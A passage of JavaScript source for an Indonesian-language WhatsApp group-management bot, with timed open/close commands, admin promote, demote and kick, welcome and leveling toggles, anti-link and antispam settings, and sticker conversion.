					client.groupSettingChange(from, GroupSettingChange.messageSend, false)
					}, 1200000)
					setTimeout( () => {
					client.sendMessage(from, '10 menit grup ini akan Reneasy buka', text)
					}, 600000)
					setTimeout( () => {
					client.sendMessage(from, '20 menit grup ini akan Reneasy buka', text)
					}, 2500)
					setTimeout( () => {
					client.sendMessage(from, 'Dalam waktu 20 menit grup ini akan Reneasy buka', text)
					}, 0)
			break
			case 'tutup20m':
				if (!isGroup) return  reply('Command ini tidak bisa digunakan di pribadi!\n\n*Harap gunakan di group!*')
				if (!isGroupAdmins) return reply(ind.admin())
				if (!isBotGroupAdmins) return reply(ind.badmin())
				console.log(color('[COMMAND]', 'blue'), color(command, 'yellow'), color(time, 'white'), color('Name:', 'yellow'), color(pushname, 'cyan'), color('Number:', 'yellow'), color(sender.split('@')[0], 'cyan'))
					setTimeout( () => {
					reply(`*BERHASIL MENUTUP GROUP*`)
					client.groupSettingChange(from, GroupSettingChange.messageSend, true)
					}, 1200000)
					setTimeout( () => {
					client.sendMessage(from, '10 menit grup ini akan Reneasy tutup', text)
					}, 600000)
					setTimeout( () => {
					client.sendMessage(from, '20 menit grup ini akan Reneasy tutup', text)
					}, 2500)
					setTimeout( () => {
					client.sendMessage(from, 'Dalam waktu 20 menit grup ini akan Reneasy tutup', text)
					}, 0)
			break
			case 'buka30m':
				if (!isGroup) return  reply('Command ini tidak bisa digunakan di pribadi!\n\n*Harap gunakan di group!*')
				if (!isGroupAdmins) return reply(ind.admin())
				if (!isBotGroupAdmins) return reply(ind.badmin())
				console.log(color('[COMMAND]', 'blue'), color(command, 'yellow'), color(time, 'white'), color('Name:', 'yellow'), color(pushname, 'cyan'), color('Number:', 'yellow'), color(sender.split('@')[0], 'cyan'))
					setTimeout( () => {
					reply(`*BERHASIL MEMBUKA GROUP*`)
					client.groupSettingChange(from, GroupSettingChange.messageSend, false)
					}, 1800000)
					setTimeout( () => {
					client.sendMessage(from, '10 menit grup ini akan Reneasy buka', text)
					}, 1200000)
					setTimeout( () => {
					client.sendMessage(from, '20 menit grup ini akan Reneasy buka', text)
					}, 600000)
					setTimeout( () => {
					client.sendMessage(from, '30 menit grup ini akan Reneasy buka', text)
					}, 2500)
					setTimeout( () => {
					client.sendMessage(from, 'Dalam waktu 30 menit grup ini akan Reneasy buka', text)
					}, 0)
			break
			case 'tutup30m':
				if (!isGroup) return  reply('Command ini tidak bisa digunakan di pribadi!\n\n*Harap gunakan di group!*')
				if (!isGroupAdmins) return reply(ind.admin())
				if (!isBotGroupAdmins) return reply(ind.badmin())
				console.log(color('[COMMAND]', 'blue'), color(command, 'yellow'), color(time, 'white'), color('Name:', 'yellow'), color(pushname, 'cyan'), color('Number:', 'yellow'), color(sender.split('@')[0], 'cyan'))
					setTimeout( () => {
					reply(`*BERHASIL MENUTUP GROUP*`)
					client.groupSettingChange(from, GroupSettingChange.messageSend, true)
					}, 1800000)
					setTimeout( () => {
					client.sendMessage(from, '10 menit grup ini akan Reneasy tutup', text)
					}, 1200000)
					setTimeout( () => {
					client.sendMessage(from, '20 menit grup ini akan Reneasy tutup', text)
					}, 600000)
					setTimeout( () => {
					client.sendMessage(from, '30 menit grup ini akan Reneasy tutup', text)
					}, 2500)
					setTimeout( () => {
					client.sendMessage(from, 'Dalam waktu 30 menit grup ini akan Reneasy tutup', text)
					}, 0)
			break
			case 'buka40m':
				if (!isGroup) return  reply('Command ini tidak bisa digunakan di pribadi!\n\n*Harap gunakan di group!*')
				if (!isGroupAdmins) return reply(ind.admin())
				if (!isBotGroupAdmins) return reply(ind.badmin())
				console.log(color('[COMMAND]', 'blue'), color(command, 'yellow'), color(time, 'white'), color('Name:', 'yellow'), color(pushname, 'cyan'), color('Number:', 'yellow'), color(sender.split('@')[0], 'cyan'))
				setTimeout( () => {
					reply(`*BERHASIL MEMBUKA GROUP*`)
					client.groupSettingChange(from, GroupSettingChange.messageSend, false)
					}, 2400000)
					setTimeout( () => {
					client.sendMessage(from, '10 menit grup ini akan Reneasy buka', text)
					}, 1800000)
					setTimeout( () => {
					client.sendMessage(from, '20 menit grup ini akan Reneasy buka', text)
					}, 1200000)
					setTimeout( () => {
					client.sendMessage(from, '30 menit grup ini akan Reneasy buka', text)
					}, 600000)
					setTimeout( () => {
					client.sendMessage(from, '40 menit grup ini akan Reneasy buka', text)
					}, 2500)
					setTimeout( () => {
					client.sendMessage(from, 'Dalam waktu 40 menit grup ini akan Reneasy buka', text)
					}, 0)
			break
			case 'tutup40m':
				if (!isGroup) return  reply('Command ini tidak bisa digunakan di pribadi!\n\n*Harap gunakan di group!*')
				if (!isGroupAdmins) return reply(ind.admin())
				if (!isBotGroupAdmins) return reply(ind.badmin())
				console.log(color('[COMMAND]', 'blue'), color(command, 'yellow'), color(time, 'white'), color('Name:', 'yellow'), color(pushname, 'cyan'), color('Number:', 'yellow'), color(sender.split('@')[0], 'cyan'))
				setTimeout( () => {
					reply(`*BERHASIL MENUTUP GROUP*`)
					client.groupSettingChange(from, GroupSettingChange.messageSend, true)
					}, 2400000)
					setTimeout( () => {
					client.sendMessage(from, '10 menit grup ini akan Reneasy tutup', text)
					}, 1800000)
					setTimeout( () => {
					client.sendMessage(from, '20 menit grup ini akan Reneasy tutup', text)
					}, 1200000)
					setTimeout( () => {
					client.sendMessage(from, '30 menit grup ini akan Reneasy tutup', text)
					}, 600000)
					setTimeout( () => {
					client.sendMessage(from, '40 menit grup ini akan Reneasy tutup', text)
					}, 2500)
					setTimeout( () => {
					client.sendMessage(from, 'Dalam waktu 40 menit grup ini akan Reneasy tutup', text)
					}, 0)
			break
			case 'buka50m':
				if (!isGroup) return  reply('Command ini tidak bisa digunakan di pribadi!\n\n*Harap gunakan di group!*')
				if (!isGroupAdmins) return reply(ind.admin())
				if (!isBotGroupAdmins) return reply(ind.badmin())
				console.log(color('[COMMAND]', 'blue'), color(command, 'yellow'), color(time, 'white'), color('Name:', 'yellow'), color(pushname, 'cyan'), color('Number:', 'yellow'), color(sender.split('@')[0], 'cyan'))
				setTimeout( () => {
					reply(`*BERHASIL MEMBUKA GROUP*`)
					client.groupSettingChange(from, GroupSettingChange.messageSend, false)
					}, 3000000)
					setTimeout( () => {
					client.sendMessage(from, '10 menit grup ini akan Reneasy buka', text)
					}, 2400000)
					setTimeout( () => {
					client.sendMessage(from, '20 menit grup ini akan Reneasy buka', text)
					}, 1800000)
					setTimeout( () => {
					client.sendMessage(from, '30 menit grup ini akan Reneasy buka', text)
					}, 1200000)
					setTimeout( () => {
					client.sendMessage(from, '40 menit grup ini akan Reneasy buka', text)
					}, 600000)
					setTimeout( () => {
					client.sendMessage(from, '50 menit grup ini akan Reneasy buka', text)
					}, 2500)
					setTimeout( () => {
					client.sendMessage(from, 'Dalam waktu 50 menit grup ini akan Reneasy buka', text)
					}, 0)
			break
			case 'tutup50m':
				if (!isGroup) return  reply('Command ini tidak bisa digunakan di pribadi!\n\n*Harap gunakan di group!*')
				if (!isGroupAdmins) return reply(ind.admin())
				if (!isBotGroupAdmins) return reply(ind.badmin())
				console.log(color('[COMMAND]', 'blue'), color(command, 'yellow'), color(time, 'white'), color('Name:', 'yellow'), color(pushname, 'cyan'), color('Number:', 'yellow'), color(sender.split('@')[0], 'cyan'))
				setTimeout( () => {
					reply(`*BERHASIL MENUTUP GROUP*`)
					client.groupSettingChange(from, GroupSettingChange.messageSend, true)
					}, 3000000)
					setTimeout( () => {
					client.sendMessage(from, '10 menit grup ini akan Reneasy tutup', text)
					}, 2400000)
					setTimeout( () => {
					client.sendMessage(from, '20 menit grup ini akan Reneasy tutup', text)
					}, 1800000)
					setTimeout( () => {
					client.sendMessage(from, '30 menit grup ini akan Reneasy tutup', text)
					}, 1200000)
					setTimeout( () => {
					client.sendMessage(from, '40 menit grup ini akan Reneasy tutup', text)
					}, 600000)
					setTimeout( () => {
					client.sendMessage(from, '50 menit grup ini akan Reneasy tutup', text)
					}, 2500)
					setTimeout( () => {
					client.sendMessage(from, 'Dalam waktu 50 menit grup ini akan Reneasy tutup', text)
					}, 0)
			break
			case 'buka60m':
				if (!isGroup) return  reply('Command ini tidak bisa digunakan di pribadi!\n\n*Harap gunakan di group!*')
				if (!isGroupAdmins) return reply(ind.admin())
				if (!isBotGroupAdmins) return reply(ind.badmin())
				console.log(color('[COMMAND]', 'blue'), color(command, 'yellow'), color(time, 'white'), color('Name:', 'yellow'), color(pushname, 'cyan'), color('Number:', 'yellow'), color(sender.split('@')[0], 'cyan'))
				setTimeout( () => {
					reply(`*BERHASIL MEMBUKA GROUP*`)
					client.groupSettingChange(from, GroupSettingChange.messageSend, false)
					}, 3600000)
					setTimeout( () => {
					client.sendMessage(from, '10 menit grup ini akan Reneasy buka', text)
					}, 3000000)
					setTimeout( () => {
					client.sendMessage(from, '20 menit grup ini akan Reneasy buka', text)
					}, 2400000)
					setTimeout( () => {
					client.sendMessage(from, '30 menit grup ini akan Reneasy buka', text)
					}, 1800000)
					setTimeout( () => {
					client.sendMessage(from, '40 menit grup ini akan Reneasy buka', text)
					}, 1200000)
					setTimeout( () => {
					client.sendMessage(from, '50 menit grup ini akan Reneasy buka', text)
					}, 600000)
					setTimeout( () => {
					client.sendMessage(from, '60 menit grup ini akan Reneasy buka', text)
					}, 2500)
					setTimeout( () => {
					client.sendMessage(from, 'Dalam waktu 60 menit grup ini akan Reneasy buka', text)
					}, 0)
			break
			case 'tutup60m':
				if (!isGroup) return  reply('Command ini tidak bisa digunakan di pribadi!\n\n*Harap gunakan di group!*')
				if (!isGroupAdmins) return reply(ind.admin())
				if (!isBotGroupAdmins) return reply(ind.badmin())
				console.log(color('[COMMAND]', 'blue'), color(command, 'yellow'), color(time, 'white'), color('Name:', 'yellow'), color(pushname, 'cyan'), color('Number:', 'yellow'), color(sender.split('@')[0], 'cyan'))
				setTimeout( () => {
					reply(`*BERHASIL MENUTUP GROUP*`)
					client.groupSettingChange(from, GroupSettingChange.messageSend, true)
					}, 3600000)
					setTimeout( () => {
					client.sendMessage(from, '10 menit grup ini akan Reneasy tutup', text)
					}, 3000000)
					setTimeout( () => {
					client.sendMessage(from, '20 menit grup ini akan Reneasy tutup', text)
					}, 2400000)
					setTimeout( () => {
					client.sendMessage(from, '30 menit grup ini akan Reneasy tutup', text)
					}, 1800000)
					setTimeout( () => {
					client.sendMessage(from, '40 menit grup ini akan Reneasy tutup', text)
					}, 1200000)
					setTimeout( () => {
					client.sendMessage(from, '50 menit grup ini akan Reneasy tutup', text)
					}, 600000)
					setTimeout( () => {
					client.sendMessage(from, '60 menit grup ini akan Reneasy tutup', text)
					}, 2500)
					setTimeout( () => {
					client.sendMessage(from, 'Dalam waktu 60 menit grup ini akan Reneasy tutup', text)
					}, 0)
			break
			case 'tutup':
				if (!isGroup) return  reply('Command ini tidak bisa digunakan di pribadi!\n\n*Harap gunakan di group!*')
				if (!isGroupAdmins) return reply(ind.admin())
				if (!isBotGroupAdmins) return reply(ind.badmin())
				console.log(color('[COMMAND]', 'blue'), color(command, 'yellow'), color(time, 'white'), color('Name:', 'yellow'), color(pushname, 'cyan'), color('Number:', 'yellow'), color(sender.split('@')[0], 'cyan'))
				setTimeout( () => {
					reply(`*BERHASIL MENUTUP GROUP*`)
					client.groupSettingChange(from, GroupSettingChange.messageSend, true)
					}, 0)
			break
			case 'buka':
				if (!isGroup) return  reply('Command ini tidak bisa digunakan di pribadi!\n\n*Harap gunakan di group!*')
				if (!isGroupAdmins) return reply(ind.admin())
				if (!isBotGroupAdmins) return reply(ind.badmin())
				console.log(color('[COMMAND]', 'blue'), color(command, 'yellow'), color(time, 'white'), color('Name:', 'yellow'), color(pushname, 'cyan'), color('Number:', 'yellow'), color(sender.split('@')[0], 'cyan'))
				setTimeout( () => {
					reply(`*BERHASIL MEMBUKA GROUP*`)
					client.groupSettingChange(from, GroupSettingChange.messageSend, false)
					}, 0)
			break
		case 'grup':
		case 'group':
					if (!isGroup) return reply(ind.groupo())
					if (!isGroupAdmins) return reply(ind.admin())
					if (!isBotGroupAdmins) return reply(ind.badmin())
					if (args[0] === 'buka') {
					    reply(`*BERHASIL MEMBUKA GROUP*`)
						client.groupSettingChange(from, GroupSettingChange.messageSend, false)
					} else if (args[0] === 'tutup') {
						reply(`*BERHASIL MENUTUP GROUP*`)
						client.groupSettingChange(from, GroupSettingChange.messageSend, true)
					}
					break      
            case 'admin':
            case 'owner':
            case 'creator':
            case 'developer':
                  client.sendMessage(from, {displayname: "Jeff", vcard: vcard}, MessageType.contact, { quoted: mek})
                  client.sendMessage(from, 'Tuh nomer owner ku >_<, cwo ganteng tapi sayang masih jomblo😅',MessageType.text, { quoted: mek} )
					break    
           case 'setname':
           if (!isRegistered) return reply( ind.noregis())
					if (!isGroup) return reply(ind.groupo())
					if (!isGroupAdmins) return reply(ind.admin())
					if (!isBotGroupAdmins) return reply(ind.badmin())
					client.groupUpdateSubject(from, `${body.slice(9)}`)
					client.sendMessage(from, 'Succes, Ganti Nama Grup', text, {quoted: mek})
					break
                case 'setdesc':
                if (!isRegistered) return reply( ind.noregis())
					if (!isGroup) return reply(ind.groupo())
					if (!isGroupAdmins) return reply(ind.admin())
					if (!isBotGroupAdmins) return reply(ind.badmin())
					client.groupUpdateDescription(from, `${body.slice(9)}`)
					client.sendMessage(from, 'Succes, Ganti Deskripsi Grup', text, {quoted: mek})
					break
                      case 'demote':
                      if (!isRegistered) return reply( ind.noregis())
					if (!isGroup) return reply(ind.groupo())
					if (!isGroupAdmins) return reply(ind.admin())
					if (!isBotGroupAdmins) return reply(ind.badmin())
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('*Tag target yang ingin di turunkan admin group!*')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = ''
						for (let _ of mentioned) {
							teks += `*Perintah diterima, menurunkan jadi admin group* :\n`
							teks += `@_.split('@')[0]`
						}
						mentions(teks, mentioned, true)
						client.groupDemoteAdmin(from, mentioned)
					} else {
						mentions(`*Perintah diterima, menurunkan* @${mentioned[0].split('@')[0]} *jadi admin group*`, mentioned, true)
						client.groupDemoteAdmin(from, mentioned)
					}
					break
			case 'promote':
			if (!isRegistered) return reply( ind.noregis())
					if (!isGroup) return reply(ind.groupo())
					if (!isGroupAdmins) return reply(ind.admin())
					if (!isBotGroupAdmins) return reply(ind.badmin())
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('*Tag target yang ingin di jadikan admin group!*')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = ''
						for (let _ of mentioned) {
							teks += `*Selamat* 🥳 *Anda naik menjadi admin group* 🎉 :\n`
							teks += `@_.split('@')[0]`
						}
						mentions(teks, mentioned, true)
						client.groupMakeAdmin(from, mentioned)
					} else {
						mentions(`*Selamat* 🥳 @${mentioned[0].split('@')[0]} *Anda naik menjadi admin group* 🎉`, mentioned, true)
						client.groupMakeAdmin(from, mentioned)
					}
					break
		case 'kick':
		if (!isRegistered) return reply( ind.noregis())
					if (!isGroup) return reply(ind.groupo())
					if (!isGroupAdmins) return reply(ind.admin())
					if (!isBotGroupAdmins) return reply(ind.badmin())
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('𝗧𝗮𝗴 𝘁𝗮𝗿𝗴𝗲𝘁 ??𝗮𝗻𝗴 𝗶𝗻𝗴𝗶𝗻 𝗱𝗶 𝘁𝗲𝗻𝗱𝗮𝗻𝗴!')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = ''
						for (let _ of mentioned) {
							teks += `╭────────────────⊱
║> *_PERMINTAAN DITERIMA_*
╰────────────────⊱
 🤭 :\n`
							teks += `@_.split('@')[0]`
						}
						mentions(teks, mentioned, true)
						client.groupRemove(from, mentioned)
					} else {
						mentions(`╭────────────────⊱
║> *_PERMINTAAN DITERIMA_*
╰────────────────⊱
 @${mentioned[0].split('@')[0]} 🤭`, mentioned, true)
						client.groupRemove(from, mentioned)
					}
					break
		case 'listadmin':
		if (!isRegistered) return reply( ind.noregis())
					if (!isGroup) return reply(ind.groupo())
					teks = `List admin of group *${groupMetadata.subject}*\nTotal : ${groupAdmins.length}\n\n`
					no = 0
					for (let admon of groupAdmins) {
						no += 1
						teks += `[${no.toString()}] @${admon.split('@')[0]}\n`
					}
					mentions(teks, groupAdmins, true)
					break
		
		case 'leveling':
					if (!isGroup) return reply(ind.groupo())
					if (!isGroupAdmins) return reply(ind.admin())
					if (args.length < 1) return reply('Mengaktifkan tekan 1, Menonaktif tekan 0')
					if (args[0] === '1') {
					if (isLevelingOn) return reply('*Fitur level sudah aktif sebelum nya*')
					_leveling.push(from)
					fs.writeFileSync('./database/kelompok/leveling.json', JSON.stringify(_leveling))
					reply(ind.lvlon())
					} else if (args[0] === '0') {
					_leveling.splice(from, 1)
						fs.writeFileSync('./database/kelompok/leveling.json', JSON.stringify(_leveling))
						reply(ind.lvloff())
					} else {
						reply(ind.satukos())
					}
					break
		case 'welcome':
		if (!isRegistered) return reply( ind.noregis())
					if (!isGroup) return reply(ind.groupo())
					if (!isGroupAdmins) return reply(ind.admin())
					if (args.length < 1) return reply('Mengaktifkan tekan 1, Menonaktif tekan 0')
					if (Number(args[0]) === 1) {
						if (isWelkom) return reply('*Fitur welcome sudah aktif sebelum nya')
						welkom.push(from)
						fs.writeFileSync('./database/bot/welkom.json', JSON.stringify(welkom))
						reply('❬ SUCCSESS ❭ mengaktifkan fitur welcome di group ini')
					} else if (Number(args[0]) === 0) {
						welkom.splice(from, 1)
						fs.writeFileSync('./database/bot/welkom.json', JSON.stringify(welkom))
						reply('❬ SUCCSESS ❭ menonaktifkan fitur welcome di group ini')
					} else {
						reply(ind.satukos())
					}
					break
					case 'simi':  
                     if (!isRegistered) return reply( ind.noregis())
			         if (isLimit(sender)) return
			         await limitAdd(sender)
                     if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} halo sayangku`)
                     anu = await fetchJson(`https://xteam.xyz/api/simi?text=Halo&lang=id&apikey=LindowApi`)
                     anu1 = `${anu.response.text}`
                     reply(anu1)
                     break
					case 'simih':
					if (!isGroup) return reply(ind.groupo())
					if (!isGroupAdmins) return reply(ind.admin())
					if (args.length < 1) return reply('Ketik #simih 1 buat aktifin Ngab :𝘃')
					if (Number(args[0]) === 1) {
						if (isSimi) return reply('SUDAH AKTIF !!!')
						samih.push(from)
						fs.writeFileSync('./database/bot/simi.json', JSON.stringify(samih))
						reply('❬ SUKSES ❭ MENGAKTIFKAN FITUR SIMI DI GRUB INI')
					} else if (Number(args[0]) === 0) {
						samih.splice(from, 1)
						fs.writeFileSync('./database/bot/simi.json', JSON.stringify(samih))
						reply('❬ SUKSES ❭ MENONAKTIFKAN FITUR SIMI DI GRUB INI')
					} else {
						reply(ind.satukos())
					}
					break
         case 'textfont':  
                     if (!isRegistered) return reply( ind.noregis())
			         if (isLimit(sender)) return
			         await limitAdd(sender)
                     if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} reneasy`)
                     F = body.slice(10)
                     anu = await fetchJson(`http://kocakz.herokuapp.com/api/random/text/fancytext?text=${F}`)
                     anu1 = `${anu.result}`
                     reply(anu1)
                     break
         case 'kapital':  
                     if (!isRegistered) return reply( ind.noregis())
			         if (isLimit(sender)) return
			         await limitAdd(sender)
                     if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} reneasy`)
                     F = body.slice(9)
                     anu = await fetchJson(`https://pecundang.herokuapp.com/api/kapital?teks=${F}`)
                     anu1 = `${anu.result}`
                     reply(anu1)
                     break
					/*case 'nsfw':
					if (!isGroup) return reply(ind.groupo())
					if (!isGroupAdmins) return reply(ind.admin())
					if (args.length < 1) return reply('KETIK #nsfw 1 Tod Buat Aktifin')
					if (Number(args[0]) === 1) {
						if (isNsfw) return reply(' *sudah aktif Slurr*  !!')
						nsfw.push(from)
						fs.writeFileSync('./database/bot/nsfw.json', JSON.stringify(nsfw))
						reply('❬ SUKSES NGAB ❭ Mengaktifkan NSFW di grub ini')
					} else if (Number(args[0]) === 0) {
						nsfw.splice(from, 1)
						fs.writeFileSync('./database/bot/nsfw.json', JSON.stringify(nsfw))
						reply('❬ SUKSES NGAB ❭ Menonaktifkan NSFW di grub ini')
					} else {
						reply(ind.satukos())
					}
					break*/
                 case 'antilink':
                 if (!isRegistered) return reply( ind.noregis())
                                	if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (args.length < 1) return reply('Ketik 1 untuk mengaktifkan')
					if (Number(args[0]) === 1) {
						if (isAntilink) return reply('Anti link group sudah aktif')
						antilink.push(from)
						fs.writeFileSync('./database/kelompok/antilink.json', JSON.stringify(antilink))
						reply('Sukses mengaktifkan anti link group di group ini ✔️')
						client.sendMessage(from,`Perhatian kepada seluruh member anti link group aktif apabila anda mengirim link group anda akan di kick dari group`, text)
					} else if (Number(args[0]) === 0) {
						if (!isAntilink) return reply('Mode anti link group sudah disable')
						antilink.splice(from, 1)
						fs.writeFileSync('./database/kelompok/antilink.json', JSON.stringify(antilink))
						reply('Sukes menonaktifkan anti link group di group ini ✔️')
					} else {
						reply('1 untuk mengaktifkan, 0 untuk menonaktifkan')
					}
					break
					case 'antivirtex':
				if (!isRegistered) return reply( ind.noregis())
				if (!isGroupAdmins) return reply(ind.admin())
		        if (!isGroup) return reply(ind.groupo())
		        if (!isBotGroupAdmins) return reply(ind.badmin())				
				if (args.length < 1) return reply('[❗] Tambahkan parameter 1 untuk mengaktifkan dan 0 untuk menonaktifkan')
				if (Number(args[0]) === 1) {
				if (isAntiVirtex) return reply(`[❗] Fitur ${command} sudah aktif`)
				antivirtex.push(from)
				fs.writeFileSync('./database/kelompok/antivirtex.json', JSON.stringify(antivirtex))
				reply(`[❗] Berhasil mengaktifkan fitur ${command} pada group ini`)
				} else if (Number(args[0]) === 0) {
				if (!isAntiVirtex) return reply(`[❗] Fitur ${command} sudah aktif`)
				var ini = anti.botLangsexOf(from)
				antivirtex.splice(ini, 1)
				fs.writeFileSync('./database/kelompok/antivirtex.json', JSON.stringify(antivirtex))
				reply(`[❗] Berhasil menonaktifkan fitur ${command} pada group ini`)
				} else {
				reply('[❗] Tambahkan parameter 1 untuk mengaktifkan dan 0 untuk menonaktifkan')
				}
				break
				case 'antispam':
				if (!isGroup) return  reply('Command ini tidak bisa digunakan di pribadi!\n\n*Harap gunakan di group!*')
					if (!isGroupAdmins) return reply(ind.admin())
				if (!isBotGroupAdmins) return reply(ind.badmin())
				console.log(color('[COMMAND]', 'blue'), color(command, 'yellow'), color(time, 'white'), color('Name:', 'yellow'), color(pushname, 'cyan'), color('Number:', 'yellow'), color(sender.split('@')[0], 'cyan'))
					if (args.length < 1) return reply('Ketik on untuk mengaktifkan, atau Ketik off untuk menonaktifkan')
					if (args[0] === 'on') {
              				if (isAntiSpam) return reply('*Fitur antispam sudah aktif sebelum nya*')
						antispam.push(from)
						fs.writeFileSync('./database/kelompok/antivirtex.json', JSON.stringify(antispam))
                  	                        reply(`Sukses mengaktifkan anti virtex group di group ini ✔️`)
					client.sendMessage(from,`Perhatian kepada seluruh member antispam group aktif jika kalian kirim spam 5000 text, anda akan di kick+blockir!`, text)
					} else if (args[0] === 'off') {
						antispam.splice(from, 1)
                 	   			fs.writeFileSync('./database/kelompok/antivirtex.json', JSON.stringify(antispam))
                 	                        reply(`Sukes menonaktifkan anti virtex group di group ini ✔️`)
					} else {
					reply(ind.satukos())
					}
		break
					// ANTI VIRUS COK BY FERNAZER
					
case 'antilinkyoutube-v':
//by Fernazer
//fix By Fernazer
                    if (!isGroup) return reply(ind.groupo())
					if (!isGroupAdmins) return reply(ind.admin())
					if (!isBotGroupAdmins) return reply(ind.badmin())
					if (args.length < 1) return reply('ketik 1 untuk mengaktifkan')
					if (Number(args[0]) === 1) {
						if (isAntiLinkytv) return reply('anti link YouTube video sudah aktif')
						antilinkytv.push(from)
						fs.writeFileSync('./database/kelompok/antilinkyt.json', JSON.stringify(antilinkytv))
						reply('Sukses mengaktifkan anti link YouTube di group ini ✔️')
						client.sendMessage(from,`「 *NOTICE GROUP* 」Jika bukan admin jangan kirim link YouTube Video`, text)
					} else if (Number(args[0]) === 0) {
						if (isAntiLinkytv) return reply('Mode anti link YouTube video sudah Mati')
						var ini = antilinkytv.indexOf(from)
						antilinkytv.splice(ini, 1)
						fs.writeFileSync('./database/kelompok/antilinkyt.json', JSON.stringify(antilinkytv))
						reply('Sukes menonaktifkan anti link YouTube video di group ini ✔️')
					} else {
						reply('1 untuk mengaktifkan, 0 untuk menonaktifkan')
					}
					break
case 'antilinkyoutube-c':
//by Fernazer
//fix By Fernazer
                    if (!isGroup) return reply(ind.groupo())
					if (!isGroupAdmins) return reply(ind.admin())
					if (!isBotGroupAdmins) return reply(ind.badmin())
					if (args.length < 1) return reply('ketik 1 untuk mengaktifkan')
					if (Number(args[0]) === 1) {
						if (isAntiLinkytc) return reply('anti link YouTube channel sudah aktif')
						antilinkytc.push(from)
						fs.writeFileSync('./database/kelompok/antilinkytchannel.json', JSON.stringify(antilinkytc))
						reply('Sukses mengaktifkan anti link YouTube channel di group ini ✔️')
						client.sendMessage(from,`「 *NOTICE GROUP* 」Jika bukan admin jangan kirim link YouTube Channel`, text)
					} else if (Number(args[0]) === 0) {
						if (isAntiLinkytc) return reply('Mode anti link YouTube channel sudah Mati')
						var ini = antilinkytv.indexOf(from)
						antilinkytc.splice(ini, 1)
						fs.writeFileSync('./database/kelompok/antilinkytchannel.json', JSON.stringify(antilinkytc))
						reply('Sukes menonaktifkan anti link YouuTube channel di group ini ✔️')
					} else {
						reply('1 untuk mengaktifkan, 0 untuk menonaktifkan')
					}
					break

case 'antilinktelegram':
//by @Fernazer
//Fix By Fernazer
                    if (!isGroup) return reply(ind.groupo())
					if (!isGroupAdmins) return reply(ind.admin())
					if (!isBotGroupAdmins) return reply(ind.badmin())
					if (args.length < 1) return reply('ketik enable untuk mengaktifkan')
					if (args[0] === '1') {
					if (isAntiLinkTelegram) return reply('*SUDAH DI AKTIFKAN SEBELUMNYA*')
						antitelegram.push(from)
						fs.writeFileSync('./database/kelompok/antilinktelegram.json', JSON.stringify(antitelegram))
						reply('「 *TELEGRAM DETECTOR* 」 PERINTAH DITERIMA, ANTI LINK TELEGRAM SUDAH ENABLE!')
						client.sendMessage(from,`「 *NOTICE GROUP* 」Jika bukan admin jangan kirim link Telegram! Jika Anda Kirim Maka Bot Akan Mengeluarkanmu.`, text)
					} else if (args[0] === '0') {
						var ini = antitelegram.indexOf(from)
						antitelegram.splice(ini, 1)
						fs.writeFileSync('./database/kelompok/antilinktelegram.json', JSON.stringify(antitelegram))
						reply('「 *TELEGRAM DETECTOR* 」 PERINTAH DI TERIMA, ANTI LINK TELEGRAM SUDAH DISABLE!')
					} else {
						reply('enable untuk mengaktifkan, disable untuk menonaktifkan')
					}
					break
                 case 'event':
					if (!isGroup) return reply(ind.groupo())
					if (!isOwner) return reply(ind.ownerb()) 
					if (args.length < 1) return reply('Mengaktifkan tekan 1, Menonaktif tekan 0')
					if (Number(args[0]) === 1) {
						if (isEventon) return reply('*Fitur event sudah aktif sebelum nya*')
						event.push(from)
						fs.writeFileSync('./database/bot/event.json', JSON.stringify(event))
						reply('❬ SUCCSESS ❭ mengaktifkan fitur event di group ini')
					} else if (Number(args[0]) === 0) {
						event.splice(from, 1)
						fs.writeFileSync('./database/bot/event.json', JSON.stringify(event))
						reply('❬ SUCCSESS ❭ menonaktifkan fitur event di group ini')
					} else {
						reply(ind.satukos())
					}
					break
                 case 'eventt':
					if (!isGroup) return reply(ind.groupo())
				if (!isAdmin) return reply('*Only Admin bot*')
					if (args.length < 1) return reply('Mengaktifkan tekan 1, Menonaktif tekan 0')
					if (Number(args[0]) === 1) {
						if (isEventon) return reply('*Fitur event sudah aktif sebelum nya*')
						event.push(from)
						fs.writeFileSync('./database/bot/event.json', JSON.stringify(event))
						reply('❬ SUCCSESS ❭ mengaktifkan fitur event di group ini')
					} else if (Number(args[0]) === 0) {
						event.splice(from, 1)
						fs.writeFileSync('./database/bot/event.json', JSON.stringify(event))
						reply('❬ SUCCSESS ❭ menonaktifkan fitur event di group ini')
					} else {
						reply(ind.satukos())
					}
					break
				case 'stiker': 
				case 'sticker':
				case 's':
				if (!isRegistered) return reply(ind.noregis())
				if (isBanned) return reply(ind.baned())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
                    await limitAdd(sender)
                    reply(ind.wait())
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						const media = await client.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.webp')
						await ffmpeg(`./${media}`)
							.input(media)
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								reply(ind.stikga())
							})
							.on('end', function () {
								console.log('Finish')
								buffer = fs.readFileSync(ran)
								client.sendMessage(from, buffer, sticker, {quoted: freply})
								fs.unlinkSync(media)
								fs.unlinkSync(ran)
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(ran)
